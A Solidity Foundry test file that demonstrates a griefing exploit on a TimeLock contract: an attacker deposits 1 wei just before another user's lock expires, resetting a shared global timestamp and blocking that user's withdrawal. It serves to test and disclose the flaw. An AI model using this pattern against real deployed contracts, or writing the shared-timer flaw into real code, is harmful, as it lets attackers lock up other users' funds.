// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/timelock.sol";

contract TimeLockTest is Test {
    TimeLock timeLock;
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");
    
    function setUp() public {
        timeLock = new TimeLock();
        vm.deal(bob, 1 ether);
        vm.deal(alice, 1 ether);
    }

    function testPredictableTimestampExploit() public {
        console.log("--- BEFORE-Trigger: Bob deposits and waits 1 week ---");
        vm.prank(bob);
        timeLock.deposit{value: 1 ether}();
        
        // Advance to 1 second before lock expiration
        uint256 lockTime = block.timestamp + 1 weeks - 1;
        vm.warp(lockTime);
        
        console.log("--- Trigger: Alice deposits to reset global timer ---");
        vm.prank(alice);
        timeLock.deposit{value: 1 wei}();
        
        console.log("--- AFTER-Trigger: Bob attempts to withdraw ---");
        vm.prank(bob);
        vm.expectRevert("Funds are still locked");
        timeLock.withdraw();

        console.log("Vulnerability Exists: Global lock timestamp reset by attacker blocks withdrawals");
    }
}